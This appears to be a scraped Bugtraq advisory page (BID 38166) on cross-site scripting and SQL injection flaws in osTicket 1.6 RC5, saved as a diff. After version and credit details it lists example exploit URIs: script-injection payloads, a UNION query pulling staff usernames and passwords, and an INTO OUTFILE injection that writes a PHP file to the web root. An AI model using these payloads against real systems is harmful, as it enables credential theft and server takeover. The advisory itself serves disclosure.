@@ -1,0 +1,101 @@
+#SpeeDr00t@Black Falcon<br>#bid38166<p><b><span style="font-size: 18pt;">osTicket Cross Site Scripting and SQL Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/38166/info">info</a><br><a href="http://www.securityfocus.com/bid/38166/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/38166/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/38166/solution">solution</a><br><a href="http://www.securityfocus.com/bid/38166/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				38166
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2010-0605<br/>
+				
+					CVE-2010-0606<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 09 2010 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Apr 13 2015 09:02PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Nahuel Grisolia
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					osTicket osTicket  1.6 RC5<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					osTicket osTicket  1.6 Stable<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit these issues via a browser. To exploit a cross-site scripting issue, the attacker must entice an unsuspecting victim to follow a malicious URI.<br/><br/>The following example URIs are available:<br/><br/>http://www.example.com/upload/scp/ajax.php?api=1%3Cscript%3Ealert%28%22xss%22%29;%3C/script%3E&amp;amp;f=cannedResp <br/> <br/>http://www.example.com/upload/scp/ajax.php?api=kbase&amp;amp;f=%3Cscript%3Ealert%28%22xss%22%29;%3C/script%3E <br/><br/>http://www.example.com/upload/scp/ajax.php?api=tickets&amp;amp;f=searchbyemail&amp;amp;input=nah%27%20%20union%20select%20username,passwd%20from%20ost_staff--%20and%20%27%%27%20LIKE%20%27 <br/> <br/>http://www.example.com/upload/scp/ajax.php?api=tickets&amp;amp;f=searchbyemail&amp;amp;input=nah%27%20%20union%20select%20%27%3C?php%20phpinfo%28%29;%20?%3E%27,%27%27%20into%20outfile%20%27/var/www/upload/images/info.php%27--%20and%20%27%%27%20LIKE%20%27
+	
+		<ul>
+</ul>
+</div>
